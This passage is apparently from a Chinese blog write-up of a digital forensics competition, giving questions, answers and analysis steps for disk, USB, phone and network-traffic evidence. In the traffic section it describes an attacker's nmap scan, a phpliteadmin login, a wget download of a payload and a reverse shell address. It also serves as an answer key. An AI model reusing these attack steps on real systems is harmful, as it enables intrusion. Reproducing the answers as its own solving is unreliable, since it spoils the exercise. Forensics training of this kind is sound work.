alt="image-20241127165643535"></p><pre><code>4767951e073483956c0ae607c0e8920eba840c7f45691a0c700ace9810887ae1</code></pre><h3 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h3><pre><code>对计算机镜像进行分析，该操作系统通过SSH连接工具连接CCTalk测试环境的SSH端口为？（填写数字，答案格式如：1234） (2分)</code></pre><pre><code>12849</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271657741.png" alt="image-20241127165743459"></p><h3 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h3><pre><code>对计算机镜像进行分析，该操作系统通过SSH连接工具连接的CCTalk境外服务器是哪个运营商的？（填写汉字，答案格式：阿里云） (2分)</code></pre><pre><code>亚马逊云</code></pre><p>在回收站中找到了删除的CCTalk的xftp连接文件 我们导出一下看看 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271740814.png" alt="image-20241127174049752"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271740187.png" alt="image-20241127174045026"></p><p>看到连接了一个外网地址 直接搜一下这个ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271741767.png" alt="image-20241127174131507"></p><h3 id="12"><a href="#12" class="headerlink" title="12."></a>12.</h3><pre><code>对计算机镜像进行分析，获取机主在本机的U盾序号的后4位数字为？（填写数字，答案格式如：1234） (2分)</code></pre><pre><code>6409</code></pre><p><font color='red'><del>（太好了，是misc，我们有救了）</del></font></p><p>开始的想法是在USB的连接记录中找一找 但是没找到 直接在取证大师中搜U盾 找到一张jpg图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271914180.png" alt="image-20241127191452894"></p><p>提出来 放到010中看一下 后面有个rar压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271919583.png" alt="image-20241127191927428"></p><p>提出来 直接解压 找到U盾图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271910784.png" alt="image-20241127191015403"> </p><h3 id="13"><a href="#13" class="headerlink" title="13."></a>13.</h3><pre><code>对计算机镜像进行分析，机主存储的某篇新闻报道“小程序搅动资源争夺战”的发表年份为？（答案格式：2024） (2分)</code></pre><pre><code>2019</code></pre><p>直接搜关键词 找到在Downloads文件夹下有个caj文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271926797.png" alt="image-20241127192646475"></p><p>找个在线转换的网站转成pdf 打开看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271957545.png" alt="image-20241127195708445"></p><p>发现发表年份是2019年</p><h3 id="14"><a href="#14" class="headerlink" title="14."></a>14.</h3><pre><code>对计算机镜像进行分析，该操作系统访问“环球商贸”的IP地址为？（答案格式：127.0.0.1） (2分)</code></pre><pre><code>39.108.126.128</code></pre><p>同样 直接搜环球商贸 找到相关的浏览器访问记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281052436.png" alt="image-20241128105207294"></p><h3 id="15"><a href="#15" class="headerlink" title="15."></a>15.</h3><p>对计算机镜像进行分析，“环球商贸”服务器配置的登录密码为？（答案按照实际填写，字母存在大小写） (2分)</p><pre><code>HQSM#20231108@gwWeB</code></pre><p>在翻找<code>huanqiushangmao</code>字段的过程中 找到了一个finalshell连接的配置文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281546194.png" alt="image-20241128154611038"></p><p>导出来 在里面看到密码的密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281548269.png" alt="image-20241128154858172"></p><p>找个项目解密一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281549899.png" alt="image-20241128154917845"></p><h3 id="16"><a href="#16" class="headerlink" title="16."></a>16.</h3><p>对计算机镜像进行分析，机主安装的PC-Server服务环境的登录密码是？（答案按照实际填写，字母全小写） (2分)</p><pre><code>jlb654321</code></pre><p>同上题 在上一级文件夹conn中 我们也能找到使用finalshell连接PC-Server服务器的配置文件 导出 解密密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281554127.png" alt="image-20241128155457991"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281555488.png" alt="image-20241128155518419"></p><h3 id="17"><a href="#17" class="headerlink" title="17."></a>17.</h3><p>对计算机镜像进行分析，机主搭建的宝塔面板的安全入口为？（答案格式：&#x2F;abc123） (2分)</p><pre><code>/c38b336a</code></pre><p>宝塔部分 我们可以仿真起来做 在火眼的分析结果中 我们可以找到一个嵌套镜像</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281609994.png" alt="image-20241128160906824"></p><p>导出来 进行仿真 但是发现没有ens33网卡的ip地址</p><p>使用命令重新配置并启动ens33网卡</p><pre><code>sudo dhclient ens33 sudo ifconfig ens33</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281610949.png" alt="image-20241128161016868"></p><p>看到ip为<code>192.168.238.134</code> 使用xshell进行连接</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281615845.png" alt="image-20241128161552775"></p><p><code>bt 14</code>查看面板信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281628197.png" alt="image-20241128162845107"></p><p>入口为<code>/c38b336a</code></p><h3 id="18"><a href="#18" class="headerlink" title="18."></a>18.</h3><p>对计算机镜像进行分析，机主搭建的宝塔面板的登录账号为？（答案格式：abcd） (2分)</p><pre><code>igmxcdsa</code></pre><p>接上题</p><p>igmxcdsa</p><h3 id="19"><a href="#19" class="headerlink" title="19."></a>19.</h3><p>对计算机镜像进行分析，其搭建的宝塔面板的登录密码为？（按实际值填写） (2分)</p><pre><code></code></pre><h3 id="20"><a href="#20" class="headerlink" title="20."></a>20.</h3><p>对计算机镜像进行分析，机主搭建的宝塔环境中绑定的宝塔账号是？（按实际值填写） (4分)</p><pre><code>17859628390</code></pre><p>这里说的应该是手机号 我们修改宝塔面板的密码 登上去看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281633513.png" alt="image-20241128163311435"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281635325.png" alt="image-20241128163535192"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281635943.png" alt="image-20241128163532809"></p><p>也可以直接翻文件</p><pre><code>/www/server/panel/data/userInfo.json</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281641901.png" alt="image-20241128164147725"></p><h3 id="21"><a href="#21" class="headerlink" title="21."></a>21.</h3><p>对计算机镜像进行分析，机主搭建的宝塔面板中Mysql环境的root密码为？（按实际值填写） (4分)</p><pre><code>123456</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281638490.png" alt="image-20241128163825386"></p><h3 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h3><p>对计算机镜像进行分析，机主搭建的宝塔面板中Mysql环境连接的端口号为？（填写数字，答案格式如：1234） (2分)</p><pre><code>3306</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281642193.png" alt="image-20241128164219057"></p><h3 id="23"><a href="#23" class="headerlink" title="23."></a>23.</h3><p>接上题，“卡号分组”表所在的数据库名为？（答案按照实际填写，字母全小写） (4分)</p><pre><code>a_train2023</code></pre><p>日志中找到了网站的数据库sql文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281644074.png" alt="image-20241128164419976"></p><p>导出 搜索<code>卡号分组</code> 找到 说明“卡号分组”表所在的数据库就是a_train2023</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281644504.png" alt="image-20241128164453085"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281645410.png" alt="image-20241128164506333"></p><h3 id="24"><a href="#24" class="headerlink" title="24."></a>24.</h3><p>接上题，“孙华锦”在2020-07-01 10:49:07时间节点的交易余额为？（答案格式：1234.56） (4分)</p><pre><code>6610.94</code></pre><p> 也是直接在数据库sql文件中找 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281645070.png" alt="image-20241128164550690"></p><p>对应的资金总表中的第八个字段 就是交易余额</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281648925.png" alt="image-20241128164824763"></p><h3 id="25"><a href="#25" class="headerlink" title="25."></a>25.</h3><p>对U盘镜像进行分析，其镜像中共有几个分区？（填写数字，答案格式如：1234） (2分)</p><pre><code>2</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301146836.png" alt="image-202411301146836"></p><h3 id="26"><a href="#26" class="headerlink" title="26."></a>26.</h3><pre><code>对U盘镜像进行分析，其中FAT32主分区的FAT表数量有几个？（请使用十进制数方式填写答案，答案格式：1234） (2分)</code></pre><pre><code>1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301321909.png" alt="image-20241130132107584"></p><h3 id="27"><a href="#27" class="headerlink" title="27."></a>27.</h3><pre><code>对U盘镜像进行分析，其中FAT32主分区定义的每扇区字节数为？（请使用十进制数方式填写答案，答案格式：1234） (2分)</code></pre><pre><code>512</code></pre><p> 同上图 扇区字节数就是扇区大小</p><h3 id="28"><a href="#28" class="headerlink" title="28."></a>28.</h3><pre><code>对U盘镜像进行分析，其中FAT32主分区的文件系统前保留扇区数为？（请使用十进制数方式填写答案，答案格式：1234） (2分)</code></pre><pre><code>7345</code></pre><pre><code>保留扇区=fat扇区位置-起始扇区位置FAT32主分区文件系统前的保留扇区数，指的是FAT32文件系统分区起始到FAT1表位置的扇区数。</code></pre><p>同上题 就是FAT1表的起始扇区数</p><h3 id="29"><a href="#29" class="headerlink" title="29."></a>29.</h3><pre><code>对U盘镜像进行分析，其中FAT32主分区的FAT1表相对于整个磁盘的起始扇区数为？（请使用十进制数方式填写答案，答案格式：1234） (2分)</code></pre><pre><code>9393</code></pre><p> 用x-ways搜</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301329379.png" alt="image-20241130132930226"></p><h3 id="30"><a href="#30" class="headerlink" title="30."></a>30.</h3><pre><code>对U盘镜像进行分析，其中NTFS逻辑分区的$MFT起始簇号为？（请使用十进制数方式填写答案，答案格式：1234） (2分)</code></pre><pre><code>109584</code></pre><p>起始扇区为876672 扇区大小512字节 一个簇是4096字节 那起始簇号就是876672*512&#x2F;4096&#x3D;109584</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301331578.png" alt="image-20241130133103424"></p><h3 id="31"><a href="#31" class="headerlink" title="31."></a>31.</h3><pre><code>对U盘镜像进行分析，其中NTFS逻辑分区的簇大小为多少个扇区？（请使用十进制数方式填写答案，答案格式：1234） (4分)</code></pre><pre><code>8</code></pre><p> 接上题 就是4096&#x2F;512&#x3D;8</p><h3 id="32"><a href="#32" class="headerlink" title="32."></a>32.</h3><pre><code>对U盘镜像进行分析，请从该镜像的两个分区中找出使用“新建文本文档.txt”记录的同一个MD5值的两部分信息，并写出该MD5值的第13--20位字符串。（答案格式：大写字母与数字组合，如：D23DDF44） (4分)</code></pre><pre><code>d668aee2</code></pre><p>在两个分区中都找到一个预览失败的图片导出来看看 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301334074.png" alt="image-20241130133437929"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301334890.png" alt="image-20241130133456523"></p><p>用r-studio导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301344172.png" alt="image-20241130134414387"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301345931.png" alt="image-20241130134522792"></p><p>010editor中把文件头改了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301345310.png" alt="image-20241130134546086"></p><p>成功修复</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301346382.png" alt="image-20241130134604302"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301346109.png" alt="image-20241130134616646"></p><h2 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h2><h3 id="1-填空题"><a href="#1-填空题" class="headerlink" title="1.[填空题]"></a>1.[填空题]</h3><pre><code>对手机镜像进行分析，机主微信ID号为？（答案按照实际填写，字母全小写） (2分)</code></pre><pre><code>wxid_gvlyzqeyg83o22</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281847300.png" alt="image-20241128184705092"></p><h3 id="2-填空题"><a href="#2-填空题" class="headerlink" title="2.[填空题]"></a>2.[填空题]</h3><pre><code>对手机镜像进行分析，机主在2023年12月登录宝塔面板使用的验证码为？（填写数字，答案格式如：1234） (2分)</code></pre><pre><code>043981</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281848147.png" alt="image-20241128184815091"></p><h3 id="3-填空题"><a href="#3-填空题" class="headerlink" title="3.[填空题]"></a>3.[填空题]</h3><pre><code>对手机镜像进行分析，小众即时通讯“鸽哒”应用程序的最后更新时间为？（答案格式如：1970-01-01 00:00:00） (2分)</code></pre><pre><code>2024-09-20 10:06:13</code></pre><p>这里其实有一些歧义 首先我们可以从<code>/system/packages.xml</code> 文件中  找到软件安装的一些信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291914005.png" alt="image-20241129191449883"></p><p>再找到这个程序的包名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291916560.png" alt="image-20241129191604500"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291916671.png" alt="image-20241129191631542"></p><pre><code>其中ut：表示app上次被更新时间</code></pre><p>我们先转10进制 再转时间戳</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291926991.png" alt="image-20241129192652927"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291927743.png" alt="image-20241129192703630"></p><p>这里得到的结果是<code>2024-09-20 09:25:19</code></p><p>我们还可以选择翻数据库 会发现在tio.db中找到一个UPDATETIME字段 得到的时间是<code>2024-09-20 10:06:13</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291929948.png" alt="image-20241129192908837"></p><p>这里产生差异可能一个是软件自动更新和用户手动更新时间的不一致 因为题干也没有详细的描述 所以这里存疑 后面可以等一下官方wp</p><h3 id="4-填空题"><a href="#4-填空题" class="headerlink" title="4.[填空题]"></a>4.[填空题]</h3><pre><code>对手机镜像进行分析，该手机中记录的最后一次开机时间。（答案格式如：1970-01-01 00:00:00） (2分)</code></pre><pre><code>2024-10-24 11:27:14</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291144401.png" alt="image-20241129114442052"></p><h3 id="5-填空题"><a href="#5-填空题" class="headerlink" title="5.[填空题]"></a>5.[填空题]</h3><pre><code>对手机镜像进行分析，该手机中高德地图APP应用的登录ID为？（答案按照实际填写） (2分)</code></pre><pre><code>950980338</code></pre><p>火眼可以直接分析出来 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291945734.png" alt="image-20241129194508483"></p><p>翻数据库也可以</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291945528.png" alt="image-20241129194554357"></p><h3 id="6-填空题"><a href="#6-填空题" class="headerlink" title="6.[填空题]"></a>6.[填空题]</h3><pre><code>对手机镜像进行分析，该手机中高德地图APP应用登录账号头像的SHA-256值前8位为？（答案格式：大写字母与数字组合，如：D23DDF44） (2分)</code></pre><pre><code>8F8A68A3</code></pre><p>翻找源文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291944779.png" alt="image-20241129194412655"></p><p>直接计算sha256值</p><pre><code>8F8A68A3459D84E204B267E9B75F05533BEC9668334F476A31C1C154DFF7E5FA</code></pre><h3 id="7-填空题"><a href="#7-填空题" class="headerlink" title="7.[填空题]"></a>7.[填空题]</h3><pre><code>对手机镜像进行分析，其中20220207-20230206的微信账单文件的解压密码为？（答案格式：按实际值填写） (2分)</code></pre><pre><code>847905</code></pre><p>先找到这个文件提取出来 直接全局搜索 我们可以发现 这个文件在计算机镜像中存在</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281857384.png" alt="image-20241128185735252"></p><p>可以直接爆破密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281858538.png" alt="image-20241128185827445"></p><p>也可以在手机镜像中找到一张微信截图 里面是传输这个文件的记录和解压密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281859621.png" alt="image-20241128185915542"></p><h3 id="8-填空题"><a href="#8-填空题" class="headerlink" title="8.[填空题]"></a>8.[填空题]</h3><pre><code>对手机镜像进行分析，机主在手机中存储的一张复古土砌矮墙照片的拍摄地为哪个城市？（答案格式：北京市） (2分)</code></pre><pre><code>景德镇</code></pre><p> 在手机镜像中的jpg图片中翻一翻就找到了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281900967.png" alt="image-20241128190019477"></p><p>把原图片提出来 我们可以看到他的exif信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281901246.png" alt="image-20241128190124164"></p><p>找个坐标拾取的在线网站搜一下</p><pre><code>29°17′9.23″117°10′43.77″</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281905508.png" alt="image-20241128190522300"></p><p>发现是景德镇</p><h3 id="9-填空题"><a href="#9-填空题" class="headerlink" title="9.[填空题]"></a>9.[填空题]</h3><pre><code>对手机镜像进行分析，通过AI合成的人脸照片中，有几张照片是通过本机当前安装的AI照片合成工具生成，并有对应记录的？（填写数字，答案格式如：1234） (4分)</code></pre><pre><code>3</code></pre><p>直接找数据库文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411290010162.png" alt="image-20241129001008816"></p><h3 id="10-填空题"><a href="#10-填空题" class="headerlink" title="10.[填空题]"></a>10.[填空题]</h3><pre><code>对手机镜像进行分析，统计出通讯录号码归属地第二多的省份是？（答案格式：广东） (4分)</code></pre><pre><code>福建</code></pre><p>选择导出——勾选项 将通讯录数据全部导出为csv表格</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411282148740.png" alt="image-20241128214825592"></p><p>在表格中选中归属地——数据——智能分列——筛选</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411282149013.png" alt="image-20241128214938839"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411282149087.png" alt="image-20241128214945021"></p><p>看到第二的省份是福建省</p><h3 id="11-填空题"><a href="#11-填空题" class="headerlink" title="11.[填空题]"></a>11.[填空题]</h3><pre><code>对手机镜像进行分析，找出“季令柏”身份证号后4位为？（答案格式：1234） (2分)</code></pre><pre><code>8043</code></pre><p>搜索身份证找到一张图片 <code>我的身份证电子信息.png</code> 但是无法正常显示 导出来放到010看一下 发现是少了png头</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411282137978.png" alt="image-20241128213728913"></p><p>加上 看到正常的身份证图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411282138346.png" alt="image-20241128213836159"></p><h3 id="12-填空题"><a href="#12-填空题" class="headerlink" title="12.[填空题]"></a>12.[填空题]</h3><pre><code>对手机镜像进行分析，找出接收“葵花宝典1.doc”文件使用的应用程序的第一次安装时间为？（答案格式如：1970-01-01 00:00:00） (2分)</code></pre><pre><code>2024-09-20 09:29:40</code></pre><p>先找接受这个文件的程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281929564.png" alt="image-20241128192930411"></p><p>很明显是Telegram 火眼可以直接解析出Telegram的安装时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281932973.png" alt="image-20241128193212783"></p><p>如果是找源文件 就是<code>system\package.xml</code>文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281950224.png" alt="image-20241128195029076"></p><p>直接从里面找telegram ft字段的值就是安装时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281951078.png" alt="image-20241128195156575"></p><p>先16进制转10进制 在转时间戳</p><pre><code class="python">import datetimeft_hex = &quot;1920d0c8fa0&quot;ft_dec = int(ft_hex, 16)print(ft_dec)# 1726795780000</code></pre><p>然后使用时间戳转换工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411282133677.png" alt="image-20241128213327582"></p><p>在线网站也能解</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411291918174.png" alt="image-20241129191857104"></p><pre><code>2024-09-20 09:29:40</code></pre><h3 id="13-填空题"><a href="#13-填空题" class="headerlink" title="13.[填空题]"></a>13.[填空题]</h3><pre><code>对手机镜像进行分析，机主使用的小众即时通讯应用使用的服务器IP为？（答案格式：127.0.0.1） (2分)</code></pre><pre><code>163.179.125.64</code></pre><p>在手机安装的这些应用中 只有鸽哒属于是小众的通讯工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411290013775.png" alt="image-20241129001337617"></p><p>直接搜源文件 翻数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411290016381.png" alt="image-20241129001622226"></p><h3 id="14-填空题"><a href="#14-填空题" class="headerlink" title="14.[填空题]"></a>14.[填空题]</h3><pre><code>对手机镜像进行分析，机主在哪个平台上发布过转让传奇游戏币的信息，请写出该平台应用APP的包名？（答案格式：com.abcd） (4分)</code></pre><pre><code>com.jiuwu</code></pre><p>手机中安装的apk中只有95分是个闲置交易平台</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411290029770.png" alt="image-20241129002933698"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411290028257.png" alt="image-20241129002855098"></p><h3 id="15-填空题"><a href="#15-填空题" class="headerlink" title="15.[填空题]"></a>15.[填空题]</h3><pre><code>对手机镜像进行分析，其中有一“双色球”网页的玩法规则中定义的“三等奖”的奖金是多少？（填写数字，答案格式如：1234） (4分)</code></pre><pre><code>3000</code></pre><p>发现应用中还有一个随机备忘录没有用到 找到包名 去翻数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292015308.png" alt="image-20241129201518088"></p><p>找到关于中奖规则的记录 是一些网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292018099.png" alt="image-20241129201825001"></p><pre><code>https://www.lottery.gov.cn/dlt/index.htmlhttps://www.lottery.gov.cn/jc/index.htmlhttps://www.lottery.gov.cn/cz/index.htmlhttps://www.lottery.gov.cn/xdgg/https://www.lottery.gov.cn/plwf/index.htmlhttps://www.lottery.gov.cn/qxc/index.htmlhttps://www.cwl.gov.cn/fcpz/yxjs/ssq/https://www.cwl.gov.cn/fcpz/yxjs/ggl/https://www.cwl.gov.cn/fcpz/yxjs/fc3d/https://www.cwl.gov.cn/fcpz/yxjs/kl8/</code></pre><p>访问下面的找到中奖规则</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292028485.png" alt="image-20241129202819351"></p><h3 id="16-填空题"><a href="#16-填空题" class="headerlink" title="16.[填空题]"></a>16.[填空题]</h3><pre><code>对手机镜像进行分析，找出手机连接过的米家摄像头终端设备的用户ID为？（答案格式：答案按照实际填写） (2分)</code></pre><pre><code>2968704175</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281908175.png" alt="image-20241128190842027"></p><h3 id="17-填空题"><a href="#17-填空题" class="headerlink" title="17.[填空题]"></a>17.[填空题]</h3><pre><code>对手机镜像进行分析，找出手机连接过的米家摄像头终端设备的IP地址为？（答案格式：127.0.0.1） (4分)</code></pre><pre><code>192.168.110.106</code></pre><p>在mmkv文件夹下的配置文件中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411281912647.png" alt="image-20241128191239486"></p><h2 id="网络流量分析"><a href="#网络流量分析" class="headerlink" title="网络流量分析"></a>网络流量分析</h2><h3 id="1-填空题-1"><a href="#1-填空题-1" class="headerlink" title="1.[填空题]"></a>1.[填空题]</h3><pre><code>分析网络流量包检材，写出抓取该流量包时所花费的秒数？（填写数字，答案格式：10） (2分)</code></pre><pre><code>3504</code></pre><p> 在捕获文件属性中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292031866.png" alt="image-20241129203133639"></p><h3 id="2-填空题-1"><a href="#2-填空题-1" class="headerlink" title="2.[填空题]"></a>2.[填空题]</h3><pre><code>分析网络流量包检材，抓取该流量包时使用计算机操作系统的build版本是多少？（答案格式：10D32） (2分)</code></pre><pre><code>23F79</code></pre><p>同上题图</p><h3 id="3-填空题-1"><a href="#3-填空题-1" class="headerlink" title="3. [填空题]"></a>3. [填空题]</h3><pre><code>分析网络流量包检材，受害者的IP地址是？（答案格式：192.168.1.1） (2分)</code></pre><pre><code>192.168.75.131</code></pre><p>看一下分组计数器 很多响应码为404的 猜测可能有扫目录或者爆破密码的攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292157975.png" alt="image-20241129215720902"></p><p>过滤看一下 来源全是192.168.75.131这个ip 既然是响应包 那来源ip就是被攻击的ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292155000.png" alt="image-20241129215553616"></p><h3 id="4-填空题-1"><a href="#4-填空题-1" class="headerlink" title="4. [填空题]"></a>4. [填空题]</h3><pre><code>分析网络流量包检材，受害者所使用的操作系统是？（小写字母，答案格式：biwu） (2分)</code></pre><pre><code>ubuntu</code></pre><p>很好找 下面一翻就有</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292158243.png" alt="image-20241129215853912"></p><h3 id="5-填空题-1"><a href="#5-填空题-1" class="headerlink" title="5. [填空题]"></a>5. [填空题]</h3><pre><code>分析网络流量包检材，攻击者使用的端口扫描工具是？（小写字母，答案格式：abc） (2分)</code></pre><pre><code>nmap</code></pre><p>到这里是扫完ip 后面就开始扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292336988.png" alt="image-20241129233657865"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292335821.png" alt="image-20241129233522647"></p><h3 id="6-填空题-1"><a href="#6-填空题-1" class="headerlink" title="6. [填空题]"></a>6. [填空题]</h3><pre><code>分析网络流量包检材，攻击者使用的漏洞检测工具的版本号是？（答案格式：1.1.1） (2分)</code></pre><pre><code>3.1.0</code></pre><p>从这里开始进行模糊测试 扫目录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292340634.png" alt="image-20241129234057490"></p><h3 id="7-填空题-1"><a href="#7-填空题-1" class="headerlink" title="7.[填空题]"></a>7.[填空题]</h3><pre><code>分析网络流量包检材，攻击者通过目录扫描得到的 phpliteadmin 登录点是？（答案格式：/abc/abc.php） (2分)</code></pre><pre><code>/dbadmin/test_db.php</code></pre><p>直接搜phpliteadmin</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292351889.png" alt="image-20241129235117398"></p><p>追踪tcp流 发现确实是登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292351288.png" alt="image-20241129235154148"></p><h3 id="8-填空题-1"><a href="#8-填空题-1" class="headerlink" title="8.[填空题]"></a>8.[填空题]</h3><pre><code>分析网络流量包检材，攻击者成功登录到 phpliteadmin 时使用的密码是？（答案格式：按实际值填写） (2分)</code></pre><pre><code>admin</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411300000798.png" alt="image-20241130000036408"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411300000427.png" alt="image-20241130000057306"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411300001787.png" alt="image-20241130000123619"></p><h3 id="9-填空题-1"><a href="#9-填空题-1" class="headerlink" title="9. [填空题]"></a>9. [填空题]</h3><pre><code>分析网络流量包检材，攻击者创建的 phpinfo 页面文件名是？（答案格式：abc.txt） (4分)</code></pre><pre><code>demo.php</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411300012867.png" alt="image-20241130001211535"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411300012655.png" alt="image-20241130001236359"></p><h3 id="10-填空题-1"><a href="#10-填空题-1" class="headerlink" title="10. [填空题]"></a>10. [填空题]</h3><pre><code>分析网络流量包检材，攻击者利用服务器漏洞从攻击机上下载的 payload 文件名是？（答案格式：abc.txt） (4分)</code></pre><pre><code>rev.txt</code></pre><p>下载就搜<code>wget</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411300013784.png" alt="image-20241130001337644"></p><h3 id="11-填空题-1"><a href="#11-填空题-1" class="headerlink" title="11.[填空题]"></a>11.[填空题]</h3><pre><code>分析网络流量包检材，攻击者反弹shell的地址及端口是？（答案格式：192.168.1.1:1234） (4分)</code></pre><pre><code>192.168.75.132:30127</code></pre><p>直接搜<code>port = </code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292042142.png" alt="image-20241129204204866"></p><h3 id="12-填空题-1"><a href="#12-填空题-1" class="headerlink" title="12. [填空题]"></a>12. 